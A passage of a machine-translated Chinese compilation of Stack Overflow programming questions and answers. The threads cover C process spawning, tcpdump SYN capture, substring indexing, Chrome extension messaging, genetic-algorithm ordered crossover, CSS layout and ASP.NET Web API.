void prepare_environment(environment& env, // environment passed by reference
                         int cellCount, int nucleusCount)
{
    prepare_cells(env.cells, cellCount);
    prepare_nuclei(env.nuclei, nucleusCount);
};

void prepare_cells(std::vector<point>& cells, // cell vector passed by reference
                   int cellCount)
{
    cells.resize(cellCount);
    // Do other stuff to initialize cells
}

void prepare_nuclei(std::vector<point>& nuclei, int cellCount) {...} 
```

在您的 main 中，您将环境结构传递给需要对其进行操作的函数：

```
int main()
{
    Environment env;

    prepare_environment(env, 16, 4);
    move_virusus(env);
} 
```

在过程编程范式中，**数据与对该数据进行操作的****过程**是分开的。数据在辅助函数链中作为参数不断传递是正常的。抵制将数据存储在全局变量中并让函数直接访问这些全局变量的诱惑。全局变量导致代码更难测试、更难阅读和更难重用。

**您应该在程序执行的操作**之后命名您的程序。名称中应该有某种动作动词，例如`**prepare**_environment`。如果该过程对某种数据进行操作，那么该数据的名称将成为该动词的宾语，例如`prepare**_environment**`

相反，您应该以它们建模的实体来命名您的结构。名字中应该有名词，例如**`environment`**

一旦你理解了过程式编程的原则，我想你会发现更容易理解面向对象的编程。

# c - C - 运行可执行文件并检索输出

> ID：11782867
> 
> 赞同：2
> 
> 时间：2012-08-02T17:37:44.730
> 
> 标签：c, windows

我正在尝试做的是创建一个程序，该程序将在运行时以“--exampleparameter --exampleparameter2”作为cli输入打开examplecliprogram.exe，等待examplecliprogram.exe终止，然后获取输出并做一些有用的事情用它。我希望 examplecliprogram.exe 在后台运行（而不是在另一个窗口中打开），而 examplecliprogram.exe 的输出显示在运行开销程序的窗口中。

到目前为止，我已经探索了诸如 popen()、ShellExecute() 和 CreateProcess() 之类的选项，但我似乎无法让它们中的任何一个正常工作。

首先，我希望这个程序能够在 Windows 环境中独立运行，并且与 Linux 的兼容性将是一个额外的好处。

编辑：我通过调用 system("arguments") 找到了一种解决方案。我不知道这是否是一个很好的解决方案，可以很好地转移到 gui，但至少它解决了基本问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T15:20:57.057

此代码在 Windows 和 Unix 上运行（我在 Visual Studio、Cygwin 上的 GCC 和 Mac OS X 上的 GCC 中进行了测试）。

我不得不根据平台使用宏来定义popen，因为在Windows上，函数是`_popen`，而在其他平台上函数名是`popen`（注意前者的下划线）。

```
#include <stdlib.h>
#include <stdio.h>

/* Change to whichever program you want */
//#define PROGRAM "program.exe --param1 --param2"
#define PROGRAM "dir"
#define CHUNK_LEN 1024

#ifdef _WIN32
#define popen _popen
#define pclose _pclose
#endif

int main(int argc, char **argv) {

    /* Ensure that output of command does interfere with stdout */
    fflush(stdin);
    FILE *cmd_file = (FILE *) popen(PROGRAM, "r");
    if (!cmd_file) {
        printf("Error calling popen\n");
    }

    char *buf = (char *) malloc(CHUNK_LEN);
    long cmd_output_len = 0;
    int bytes_read = 0;
    do {
        bytes_read = fread(buf + cmd_output_len, sizeof(char), CHUNK_LEN, cmd_file);
        cmd_output_len += bytes_read;
        buf = (char *) realloc(buf, cmd_output_len + CHUNK_LEN);
    } while (bytes_read == CHUNK_LEN);

    /* Nul terminate string */
    *((char *) buf + cmd_output_len) = '\0';

    /* Close file pointer */
    pclose(cmd_file);

    /* Do stuff with buffer */
    printf("%s\n", buf);

    /* Free buffer */
    free(buf);

    return 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T06:53:20.057

您可能想看看这个 Microsoft 示例代码。这对我很有用。 [http://msdn.microsoft.com/en-us/library/ms682499%28VS.85%29.aspx](http://msdn.microsoft.com/en-us/library/ms682499%28VS.85%29.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T07:00:42.853

我使用了 CreateProcess，不幸的是，除了“仔细阅读 msdn”和“从简单到复杂”之外，我无法向您推荐其他任何东西。

至于可移植性——如果你直到现在还不需要使用一些跨平台的工具包，我不建议你仅仅因为这个而开始使用一个。我建议您编写一些“启动过程”包装器并以本机方式在每个平台上实现它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-06T16:09:52.540

最干净和最便携的方法是使用 GLib 的`g_spawn_sync()`.

[您可以在线](http://developer.gnome.org/glib/2.32/glib-Spawning-Processes.html#g-spawn-sync)找到文档。

```
gchar * std_out = NULL;
gchar * std_err = NULL;
gint exit_stat = 0;
const char *argv[] = {"--foo", "123", "--bar", "22323", NULL};

if(!g_spawn_sync (NULL, argv, NULL, NULL, NULL, NULL, &std_out, &std_err, &exit_stat, NULL)){
   fprintf(stderr, "Failed to spawn!\n");
};

/* std_out and std_err should now point to the respective output.*/ 
```

# garbage-collection - 如何获取有关堆栈限制的平台特定信息

> ID：11782868
> 
> 赞同：0
> 
> 时间：2012-08-02T17:37:44.127
> 
> 标签：garbage-collection, stack, interpreter, chicken-scheme

我正在制作一个解释器，它以鸡计划的风格进行内存分配。基本思想是：

```
int main() {
    instruction instructions[] = { zero_root, print_root, hello_world,
                    hello_world, stop };

    top_ip.go = &instructions[0];

    setjmp(top);

    (*top_ip.go)(top_ip);

    return 0;
}
                                                          89,10-17      Bot 
```

和

```
/* The following function is machine dependent */
static bool is_time_to_gc(){
    /* Is allocated on the stack */
    char stack_top;

    /* It's address is therefore the stack's top  */
    return &stack_top >= STACK_LIMIT;
}

static void goto_next_instruction(struct instruction_pointer ip) {
    ++ip.go;

    if (is_time_to_gc()) {
            /*
             * Some complicated garbage collection stuff which I haven't
             * completed yet.
             */

            top_ip.go = ip.go;
            longjmp(top, 0);
    }

    (*ip.go)(ip);
} 
```

示例指令是：

```
static void hello_world(struct instruction_pointer ip) {
    printf("Hello World!\n");

    goto_next_instruction(ip);
} 
```

我需要知道的是 STACK_LIMIT 的值应该是什么（我还需要知道堆栈是向上还是向下增长。）如何获取有关堆栈限制的平台特定信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T19:21:33.587

`man getrlimit`. 还要检查你的 shell 通常在 /etc/login.conf 中施加的限制（如果它是 sh 衍生品，你可以通过键入来查看它们`limit`）。

:) 干杯。

# networking - 如何将所有同步数据包保存到文件中？

> ID：11782871
> 
> 赞同：0
> 
> 时间：2012-08-02T17:38:01.280
> 
> 标签：networking, tcpdump

我需要在收到的同步数据包上有一些静态数据（用于测试目的）。我迷失了可用的工具 - ethreal。tshark.tcpdumt。

我想要一个不会仅按模式转储完整数据包的简单工具（在我的情况下只有 ip，但在某些情况下我还需要有效负载）。上面（或另一个）中的哪一个做这项工作？如果你有一些病人，我会很乐意让你参考他们之间的差异。没找到好的。

我在 Ubuntu 上运行。工具、过滤器和模式都需要来自命令行。模式可以是 - ip.src ip.payload

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T18:28:34.490

以下 tcpdump 命令会将所有数据包保存到设置了 SYN 标志的文件中，并发送到存储在环境变量 MYIP 中的 IP 地址：

```
MYIP=172.16.1.2
sudo tcpdump -w /tmp/syn_packets "tcp[tcpflags] & tcp-syn != 0 and dst $MYIP" 
```

可以使用以下命令列出来自转储的唯一主机/端口列表：

```
tcpdump -nr /tmp/syn_packets |cut -d " " -f 3 |uniq 
```

可以使用以下命令列出每个主机/端口的数据包计数列表：

```
tcpdump -nr /tmp/syn_packets |cut -d " " -f 3 |uniq -c 
```

数据包内容将存储在 tmp 文件中。您可以使用 -x 选项查看数据包数据的十六进制转储：

```
tcpdump -xr /tmp/syn_packets 
```

您可以使用以下命令转储来自特定 IP 的数据包内容：

```
REMOTEIP=6.6.6.6
tcpdump -xr /tmp/syn_packets "src $REMOTEIP" 
```

# database - 如何有效地在大型数据集中搜索子字符串？

> ID：11782872
> 
> 赞同：3
> 
> 时间：2012-08-02T17:38:09.620
> 
> 标签：database, algorithm, data-structures, lucene

我有一大堆短字符串。有哪些算法和索引策略可以过滤包含子字符串的项目列表？例如，假设我有一个列表：

```
val words = List(
  "pick",
  "prepick",
  "picks",
  "picking",
  "kingly"
  ...
) 
```

如何找到包含子字符串“king”的字符串？我可以像这样蛮力解决问题：

```
words.filter(_.indexOf("king") != -1) // yields List("picking", "kingly") 
```

这仅适用于小型套装；今天我需要支持 1000 万个字符串，未来的目标是数十亿。显然我需要建立一个索引。**什么样的指数？**

我已经研究过使用存储在 MySQL 中的 ngram 索引，但我不确定这是否是最好的方法。当搜索字符串长于 ngram 大小时，我不确定如何以最佳方式查询索引。

我也考虑过使用 Lucene，但这是围绕令牌匹配优化的，而不是子字符串匹配，并且似乎不支持简单子字符串匹配的要求。Lucene 确实有一些与 ngram 相关的类（`org.apache.lucene.analysis.ngram.NGramTokenFilter`是一个例子），但这些似乎是用于拼写检查和自动完成用例，而不是子字符串匹配，而且文档很薄。

我应该考虑哪些其他算法和索引策略？有没有支持这个的开源库？可以使 SQL 或 Lucene 策略（如上）起作用吗？

另一种说明需求的方法是使用 SQL：

```
SELECT word FROM words WHERE word LIKE CONCAT('%', ?, '%'); 
```

用户提供的搜索字符串在哪里`?`，结果是包含搜索字符串的单词列表。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T19:36:57.227

最长的单词有多大？如果那大约是 7-8 个字符，您可能会找到每个字符串的所有子字符串，并将这些子字符串插入 trie（在 Aho-Corasik 中使用的那个 - [http://en.wikipedia.org/wiki/Aho-Corasick](http://en.wikipedia.org/wiki/Aho-Corasick)）它构建树需要一些时间，但是搜索所有出现的时间将是 O(length(searched word))。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T19:07:53.113

Postgres 有一个做[三元索引的模块](http://www.postgresql.org/docs/9.1/static/pgtrgm.html)

这似乎也是一个有趣的想法——建立一个三元组索引。

关于您的问题中关于如何分解大于 n-gram 长度的文本搜索的评论：

这是一种可行的方法：

假设我们有一个搜索字符串 "abcde" ，并且我们已经建立了一个三元索引。（您有长度较小的字符串 - 这可能会为您带来最佳选择）让 abc= S1, bcd=S2,cde=S3 的搜索结果（其中 S1,S2,S3 是索引集）

然后 S1,S2,S3 的最长公共子串将给出我们想要的索引。

在进行 LCS 之前，我们可以将每组索引转换为由分隔符（比如空格）分隔的单个字符串。

找到 LCS 后，我们必须在索引中搜索完整模式，因为我们已经分解了搜索词。即我们将不得不修剪具有“abc-XYZ-bcd-HJI-def”的结果

一组字符串的 LCS 可以有效地找到[Suffix Arrays](http://en.wikipedia.org/wiki/Suffix_array)。或后缀树

# actionscript-3 - 如何操作脚本将按钮链接到 HTML 页面？

> ID：11782874
> 
> 赞同：1
> 
> 时间：2012-08-02T17:38:21.433
> 
> 标签：actionscript-3, flash

我正在制作一个页面，其中我使用了一些 Flash 组件作为按钮，我想链接到另一个 HTML 页面但不知道该怎么做。有人能帮我吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T17:44:42.457

你必须在你的按钮上放置一个事件监听器来监听点击事件。

```
yourButton_mc.addEventListener(MouseEvent.CLICK, onClick, false, 0, true);
function onClick(e:MouseEvent):void{
    navigateToURL(new URLRequest("page.html"), "_self"); // change "_self" to "_blank" if want to it open in other tab or window. More info in the links I wrote below.
} 
```

这里有很好的[链接](http://www.republicofcode.com/tutorials/flash/as3link/)和[事件](http://www.republicofcode.com/tutorials/flash/as3events/)资源。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T17:49:23.857

在 Flash 中，单击您将使用的按钮并为其指定一个实例名称（在属性面板下），然后相应地更改代码。

```
// URLRequest variable(where to navigate)
var pageOnAnySiteURL:URLRequest = new URLRequest("www.example.com/useGoogle");

// Navigation function
function navigateFunc(event:MouseEvent):void {
   navigateToURL(pageOnAnySiteURL, "_blank");
}

// Fire off that event when button is clicked in FLash
buttonInstanceName_mc.addEventListener(MouseEvent.CLICK, navigateFunc); 
```

# google-chrome - Chrome 消息传递错误：尝试使用断开连接的端口对象

> ID：11782875
> 
> 赞同：2
> 
> 时间：2012-08-02T17:38:28.923
> 
> 标签：google-chrome, google-chrome-extension

我的 chrome 扩展使用长寿命的“端口”对象在“内容脚本”和“弹出”页面之间传递消息。“弹出窗口”能够向“内容脚本”事件侦听器发送消息。但是，“内容脚本”中的“端口”对象无法将消息发送到“弹出”页面。

```
var port = chrome.extension.connect({"name":"swap"});

// listener for incoming connections
chrome.extension.onConnect.addListener(function( incomingPort ){

    // listener on incoming messages
    incomingPort.onMessage.addListener(function( msg ){

        if( msg.command === 'get_scripts' ){
            //do work

        }

        var scrs = { 'scripts' : 'name' };
        var result = port.postMessage( scrs );

    });
}); 
```

执行 'port.postMessage(Object obj)' 时，插件会抛出以下错误，

```
Error in event handler for 'undefined': Attempting to use a disconnected port object   Error: Attempting to use a disconnected port object
at PortImpl.postMessage (miscellaneous_bindings:54:5)
at chrome-extension://loiamkgdhfjdlkcpehnebipeinpcicfj/swap.js:27:31
at [object Object].dispatch (event_bindings:203:41)
at Object.<anonymous> (miscellaneous_bindings:250:22) event_bindings:207 
```

我尝试使用“端口”对象和“传入端口”对象，都抛出相同的“错误”。感觉它与预先创建的“端口”对象的范围有关。

插件代码可在此 git 存储库[https://github.com/snambi/chrome_plugin/tree/master/src/chrome](https://github.com/snambi/chrome_plugin/tree/master/src/chrome)

这个插件有什么问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T20:55:34.723

我查看了您的代码，这对我来说毫无意义：

*   你知道一个端口在两边都有一个`onMessage`and方法吗？`postMessage`一个端口足以双向通信。
*   以您的方式在弹出窗口和内容脚本之间进行通信将非常困难。很难同时启动内容脚本和弹出窗口。

由于您的扩展没有背景页面，以及一个相对无用的内容脚本，我假设您的扩展的核心是浏览器操作弹出窗口。除了默认注入内容脚本之外，您还可以使用以下流程：

1.  *用户点击浏览器动作*
2.  `popup.html`并被`popup.js`执行。
    *   向 ,添加事件监听器[`chrome.runtime.onConnect`](http://code.google.com/chrome/extensions/runtime#event-onConnect)以接收端口请求。
    *   用于[`chrome.tabs.query({active:true, windowId:-2}, callback_function);`](http://code.google.com/chrome/extensions/tabs.html#method-query)在当前选项卡中选择当前窗口。（-2 是[`chrome.windows.WINDOW_ID_CURRENT`](http://code.google.com/chrome/extensions/windows.html#property-WINDOW_ID_CURRENT)常数）
    *   `callback_function`接收一个参数：一个选项卡数组。由于当前窗口不可能没有选项卡，因此选择数组的第一个元素：`var tab = tabs[0];`
    *   现在，用于[`chrome.tabs.executeScript(tab.id, {file:'swap.js'});`](http://code.google.com/chrome/extensions/tabs.html#method-executeScript)执行内容脚本。
    *   在内容脚本中，使用 连接到弹出窗口[`chrome.runtime.connect`](http://code.google.com/chrome/extensions/runtime#method-connect)。
    *   *你的逻辑在这里*。

我还看到您正在使用`port == null`检查端口是否有效。如果这样做，请确保比较有意义，方法是在端口断开连接时使变量无效：

```
var port;
chrome.runtime.onConnect.addListener(function(_port) {
    // ...optional validation of port.name...

    port = _port;
    port.onMessage.addListener(function(message) { /* .. logic .. */});
    port.onDisconnect.addListener(function() {
        port = null;
    });
}); 
```

# jquery - 简单的图像调整大小问题

> ID：11782878
> 
> 赞同：1
> 
> 时间：2012-08-02T17:38:40.070
> 
> 标签：jquery

当用户悬停我的图像并在悬停时返回其原始高度和宽度时，我试图放大图像。我无法将图像尺寸放大到我想要的值。当我悬停时，图像似乎变得非常大。不知道我做错了什么。谢谢您的帮助。

```
$('#image_layout').on({
        mouseenter: function() {
            var $this=$(this);
            console.log($this.height());
            $(this).css("z-index", 1).animate({
                    height: "120%",
                    width: "120%"                    
                }, "fast");

            $(this).after('hfdsuhods');
        },
        mouseleave: function() {
            $(this).css("z-index", 0).animate({
                    height: "100%",
                    width: "100%"

                }, "fast");
        }
     }, "img");

//images are from ajax call and the sizes are varies. 
<div id='image_layout'>
    <img src='a.jpg' />
    <img src='b.jpg' />
    <img src='c.jpg' />
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:45:59.050

```
 height: "120%",
                width: "120%" 
```

那段代码意味着使图像大小为 120%，这意味着比现在大 20%。如果图像已经相当大，那么它会增加 20%。我会将这些值更改为您更喜欢的值，从 105% 开始并从那里开始。它不会是一个非常大的增加，但它至少会阻止它在悬停时变得“非常大”。

# artificial-intelligence - 如何实现有序交叉

> ID：11782881
> 
> 赞同：4
> 
> 时间：2012-08-02T17:39:01.160
> 
> 标签：artificial-intelligence, genetic-algorithm

所以我有两个父母 ABCDE EDCBA

我可以从两者中选择一个子集吗： 从父级一：ACD 从父级二：EDC

然后我将父代一复制到子代一中，但使用父代二的顺序复制选定的子集：子代一：DBCAE 子代二：CDEBA

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T19:00:49.893

要回答标题问题：

[http://www.eecs.tufts.edu/~jfinke02/jmona/xref/jmona/example/tsp/crossover/OrderedCrossoverFunction.html](http://www.eecs.tufts.edu/~jfinke02/jmona/xref/jmona/example/tsp/crossover/OrderedCrossoverFunction.html)：

```
1   /**
2    * OrderedCrossoverFunction.java
3    * 
4    * Copyright 2009, 2010 Jeffrey Finkelstein
5    * 
6    * This file is part of jmona.
7    * 
8    * jmona is free software: you can redistribute it and/or modify it under the
9    * terms of the GNU General Public License as published by the Free Software
10   * Foundation, either version 3 of the License, or (at your option) any later
11   * version.
12   * 
13   * jmona is distributed in the hope that it will be useful, but WITHOUT ANY
14   * WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
15   * A PARTICULAR PURPOSE. See the GNU General Public License for more details.
16   * 
17   * You should have received a copy of the GNU General Public License along with
18   * jmona. If not, see <http://www.gnu.org/licenses/>.
19   */
20  package jmona.example.tsp.crossover;
21  
22  import java.util.Collections;
23  import java.util.List;
24  import java.util.Vector;
25  
26  import jmona.CrossoverFunction;
27  import jmona.functional.Range;
28  import jmona.random.RandomUtils;
29  
30  /**
31   * Ordered crossover (also known as OX) for a tour in the traveling salesman
32   * problem.
33   * 
34   * @author Jeffrey Finkelstein
35   * @since 0.1
36   */
37  // TODO references for the original authors of TSP crossover functions
38  public class OrderedCrossoverFunction implements
39      CrossoverFunction<List<Integer>> {
40  
41    /**
42     * Perform ordered crossover (also known as OX) on the specified tours.
43     * 
44     * Ordered crossover works in two stages. First, a random slice is swapped
45     * between the two tours, as in a two-point crossover. Second, repeated cities
46     * not in the swapped area are removed, and the remaining integers are added
47     * from the other tour, in the order that they appear starting from the end
48     * index of the swapped section.
49     * 
50     * @param tour1
51     *          A tour.
52     * @param tour2
53     *          Another tour.
54     * @see jmona.CrossoverFunction#crossover(Object, Object)
55     */
56    @Override
57    public void crossover(final List<Integer> tour1, final List<Integer> tour2) {
58  
59      // get the size of the tours
60      final int size = tour1.size();
61  
62      // choose two random numbers for the start and end indices of the slice
63      // (one can be at index "size")
64      final int number1 = RandomUtils.randomData().nextInt(0, size - 1);
65      final int number2 = RandomUtils.randomData().nextInt(0, size);
66  
67      // make the smaller the start and the larger the end
68      final int start = Math.min(number1, number2);
69      final int end = Math.max(number1, number2);
70  
71      // instantiate two child tours
72      final List<Integer> child1 = new Vector<Integer>();
73      final List<Integer> child2 = new Vector<Integer>();
74  
75      // add the sublist in between the start and end points to the children
76      child1.addAll(tour1.subList(start, end));
77      child2.addAll(tour2.subList(start, end));
78  
79      // iterate over each city in the parent tours
80      int currentCityIndex = 0;
81      int currentCityInTour1 = 0;
82      int currentCityInTour2 = 0;
83      for (final int i : new Range(size)) {
84  
85        // get the index of the current city
86        currentCityIndex = (end + i) % size;
87  
88        // get the city at the current index in each of the two parent tours
89        currentCityInTour1 = tour1.get(currentCityIndex);
90        currentCityInTour2 = tour2.get(currentCityIndex);
91  
92        // if child 1 does not already contain the current city in tour 2, add it
93        if (!child1.contains(currentCityInTour2)) {
94          child1.add(currentCityInTour2);
95        }
96  
97        // if child 2 does not already contain the current city in tour 1, add it
98        if (!child2.contains(currentCityInTour1)) {
99          child2.add(currentCityInTour1);
100       }
101     }
102 
103     // rotate the lists so the original slice is in the same place as in the
104     // parent tours
105     Collections.rotate(child1, start);
106     Collections.rotate(child2, start);
107 
108     // copy the tours from the children back into the parents, because crossover
109     // functions are in-place!
110     Collections.copy(tour1, child2);
111     Collections.copy(tour2, child1);
112   }
113 
114 } 
```

更多理论：[http](http://www.dmi.unict.it/mpavone/nc-cs/materiale/moscato89.pdf) ://www.dmi.unict.it/mpavone/nc-cs/materiale/moscato89.pdf （镜像： [http ://www.scribd.com/doc/101866504/1989-On-Genetic-Crossover - 相对顺序保留的运算符](http://www.scribd.com/doc/101866504/1989-On-Genetic-Crossover-Operators-for-Relative-Order-Preservation)）

相关：[http](http://www.scribd.com/doc/53306810/35/ORDERED-CROSSOVER) ://www.scribd.com/doc/53306810/35/ORDERED-CROSSOVER ：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-11-12T17:30:44.563

这是上面用我自己的随机类用 C++ 实现的代码。我不确定旋转是否正确，但交叉似乎合法。在一天结束时，你不会得到任何重复！

```
#include <array>
#include <random>
#include <iostream>

// I converted this found code into a functional class
// http://en.cppreference.com/w/cpp/numeric/random/uniform_int_distribution
class MyRandom
{
public:
    MyRandom() : gen(rd()) {}

    int nextInt(const int& max)
    {
        std::uniform_int_distribution<> dis(0, max);
        return dis(gen);
    }

private:
    std::random_device rd;
    std::mt19937_64 gen;
    std::uniform_int_distribution<> setdis;
    bool disSet = false;
};

void crossover(std::vector<int>& parent1, std::vector<int>& parent2)
{
    int size = int(parent1.size());

    MyRandom rand;
    int number1 = rand.nextInt(7);
    int number2 = rand.nextInt(7);

    int start = fmin(number1, number2);
    int end = fmax(number1, number2);

    std::vector<int> child1;
    std::vector<int> child2;

    for(int i = start; i<end; i++)
    {
        child1.push_back(parent1[i]);
        child2.push_back(parent2[i]);
    }

    int geneIndex = 0;
    int geneInparent1 = 0;
    int geneInparent2 = 0;

    for (int i = 0; i<size; i++)
    {
        geneIndex = (end + i) % size;
        geneInparent1 = parent1[geneIndex];
        geneInparent2 = parent2[geneIndex];

        bool is_there = false;
        for(int i1 = 0; i1<child1.size(); i1++)
        {
            if(child1[i1] == geneInparent2)
            {
                is_there = true;
            }
        }
        if(!is_there)
        {
            child1.push_back(geneInparent2);
        }

        bool is_there1 = false;
        for(int i1 = 0; i1<child2.size(); i1++)
        {
            if(child2[i1] == geneInparent1)
            {
                is_there1 = true;
            }
        }
        if(!is_there1)
        {
            child2.push_back(geneInparent1);
        }
    }

    std::rotate(child1.begin(), child1.begin()+start, child1.end());
    std::rotate(child2.begin(), child2.begin()+start, child2.end());

    for(int i = 0; i<size; i++)
    {
        parent1[i] = child2[i];
        parent2[i] = child1[i];
    }
}

int main(int argc, const char * argv[]) {

    std::vector<int> parent1 = {0, 1, 2, 3, 4, 5, 6, 7};
    std::vector<int> parent2 = {7, 6, 5, 4, 3, 2, 1, 0};

    for(int i = 0; i<8; i++)
    {
        std::cout << parent1[i] << " ";
    }
    std::cout << std::endl;
    for(int i = 0; i<8; i++)
    {
        std::cout << parent2[i] << " ";
    }
    std::cout << std::endl;

    crossover(parent1, parent2);

    for(int i = 0; i<8; i++)
    {
        std::cout << parent1[i] << " ";
    }
    std::cout << std::endl;
    for(int i = 0; i<8; i++)
    {
        std::cout << parent2[i] << " ";
    }
    std::cout << std::endl;

    return 0;
} 
```

# unix - 使用 cp (unix) 复制文件但跳过无法复制的文件

> ID：11782883
> 
> 赞同：0
> 
> 时间：2012-08-02T17:39:12.087
> 
> 标签：unix, copy, backup, cp

我必须备份退出的 /dev/sdX 但 cp 挂在一个文件 (/proc/kmsg) 上。它不能跳过它......就像它正在复制一个 34KB 文件一样挂起。

那么我怎样才能跳过这个文件呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-05-28T13:36:15.213

您可以使用 Midnight Commander 复制文件，然后如果您看到文件复制停止，请按跳过按钮。

如果您只有一个文件，它可以完美运行。但是，如果文件太多，则很难手动执行。我写了一个[bash 脚本](https://github.com/asapegin/timeout_folder_rescue)来处理这种情况。

# ios - 更新 cocos2d 中的循环和按钮

> ID：11782884
> 
> 赞同：0
> 
> 时间：2012-08-02T17:39:16.067
> 
> 标签：ios, cocos2d-iphone, game-physics, game-loop

我有一个简单的月球着陆器游戏。我通过积分来计算位置和所有内容 - 例如，每转一圈我都会采用向量并将它们组合起来，然后将结果向量应用于我的着陆器。

问题来了，我有一个按钮，我想用它来推力。如何在更新方法期间检查它是否打开？我想我会有一些 BOOL 标志在按下按钮时设置为 YES，但我什么时候将其设置为 NO？一些实际的实现会很棒。我使用 cocos2d-iphone 和 iOS。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:56:49.217

好吧，伪代码如下：

1.  我们不会使用 Buttons（又名 CCMenuItem），因为它们仅在修饰事件时提供回调。我们想要着陆，触摸退出/进入，触摸结束。

2.  在您`CCScene`正在显示的内容中，添加一个新的子类，它是子类的子类，甚至`CCLayer`使用`CCLayer`.`CCScene`

3.  在`CClayer`子类的 init 中，设置`isTouchEnabled`为`YES`.

4.  实现常用方法：

```
    - (void)ccTouchesBegan:...
    - (void)ccTouchesMoved:...
    - (void)ccTouchesEnded:...
    - (void)ccTouchesCancelled:...

```

最后，用这些方法施展你的魔法。

*   获取触摸位置
*   使用触摸检查`CGRectContainsPoint`是否在推力区域内。
*   等等等等...

# matlab - 如何在matlab中连接两个关闭的未连接点

> ID：11782890
> 
> 赞同：1
> 
> 时间：2012-08-02T17:39:31.913
> 
> 标签：matlab

我有一个看起来像这样的二进制图像： ![在此处输入图像描述](../Images/68f0a57055cf4cd4bed4c1618c7bac5d.png)

我有时会收到一个未闭合的凹面，就像上面的例子一样。我想关闭这些例子中的所有凹面，但我不知道如何。
谢谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T18:14:03.600

我认为你最好的选择可能是对上面的图像进行所谓的形态关闭。您可以在[此处查看此 Wiki 页面](http://en.wikipedia.org/wiki/Closing_%28morphology%29)

您可以使用`imdilate`和`imerode`函数自行完成此操作。

另一种选择是使用`bwmorph`：`bwmorph(img, 'close')`

注意：`bwmorph`要求您在`img`上面提供二进制图像 ( )。

我更喜欢使用`imdilate`and`imerode`因为你可以指定你自己的结构元素（用于确定应该填充什么的矩阵）。 `bwmorph`，如果我没记错的话，它使用了一个`one(3)`结构元素来执行它的操作。

# html - 最小宽度的孩子增长到父母的大小

> ID：11782891
> 
> 赞同：1
> 
> 时间：2012-08-02T17:39:35.473
> 
> 标签：html, css

我有一个`<div>`我想居中（自动边距）并随着内容填充它而增长，所以我使用 min-width 和 min-height 来完成这个，但是发生的是孩子`<div>`正在接受父母的（`<body>`）宽度.

我怎样才能防止这种情况发生？

示例：http: [//jsfiddle.net/kRF5d/1/](http://jsfiddle.net/kRF5d/1/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:45:00.813

由于`div`是块级元素，除非`width`设置了适当的，否则它将填充父级的整个宽度。我建议`display: inline-block;`向孩子申请`div`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:50:05.397

只需将位置从相对更改为绝对。

```
#top {
    min-width:10%;
    min-height:50px;
    background-color:blue;
    position:absolute;
    margin:auto;
    margin-top:10px;
    top:0px;
    z-index:10;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:46:49.677

您看到的问题是因为 min-width 设置了*最小*宽度，它不限制最大宽度。因此，由于 div 显示为块级元素，它会自动增长到与父元素相同的宽度。

所以虽然我不知道你具体想用这个来完成什么，但这就是它没有按预期工作的原因。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:42:39.837

If you don't want your #top div to be %100 width then give it a width.

[http://jsfiddle.net/kRF5d/3/](http://jsfiddle.net/kRF5d/3/)

# iis - IIS 5.1 和经典 ASP “您请求的页面类型未提供服务，因为它已被明确禁止。”

> ID：11782894
> 
> 赞同：1
> 
> 时间：2012-08-02T17:39:49.897
> 
> 标签：iis, asp-classic

我知道 2009 年有人对此提出了类似的问题，但我对此感到非常困惑。

我有一台 Windows XP 开发机器，用于维护经典的 ASP Web 应用程序。IIS 5.1 是 Web 服务器。

问题：一些站点提供经典 ASP 没有问题，其他站点给出“您请求的页面类型未提供，因为它已被明确禁止。扩展名 '.asp' 可能不正确。” ASP 中的错误.Net 的样子。建议没有使用 asp.dll 来提供页面！？对于两个站点，哪个 dll 与哪个文件扩展名一起使用的列表是相同的。创建的任何新站点似乎都存在与提供 cASP 相同的问题。

如果 IIS 始终无法在所有站点上为 cASP 提供服务器，我将查看通用配置，但由于它在某些而不是其他站点上工作，我完全感到困惑。

任何帮助，将不胜感激！

# ajax - 我可以对 ApiController 进行多个 POST 操作吗？

> ID：11782896
> 
> 赞同：0
> 
> 时间：2012-08-02T17:39:53.613
> 
> 标签：ajax, rest, asp.net-mvc-4, asp.net-web-api

场景：

一个`User`类有几组属性：`password`, `address`, `preference`, `roles`.

我们需要不同的 Ajax 调用来更新 (1) 用户密码、(2) 用户配置文件、(3) 用户所在的角色。

所有教程和示例仅显示一个 POST 操作来更新整个 User 类。我的问题是我们如何才能只更新部分课程。

例如，在更新用户密码时，我们将：

1.  显示一个文本框以从用户输入中收集新密码。
2.  进行 Ajax 调用，仅将新密码与 userId（如：{id=3, newPassword=xxxxx}）一起发布到 WebAPI POST 操作。
3.  该操作只会更新用户的密码。

一种解决方案：（最容易想到的）

1.  使用 userId调用`GET`操作以检索用户的所有数据
2.  使用从 Web 用户输入中获得的值更新用户数据中的密码
3.  使用更新的数据调用`POST`操作，其中包含 User 类中的所有属性。
4.  该`POST`操作将更新整个数据，而无需知道仅更改了密码。

好处：`POST`对于`ApiController`.

缺点：我们要Ajax两次。

那么，有没有可能我们可以`POST`在一个中执行多个操作`ApiController`？例如`PostPassword(userId, password)`，`PostProfile(userId, profile)`和`PostRoles(userId, roles)`。

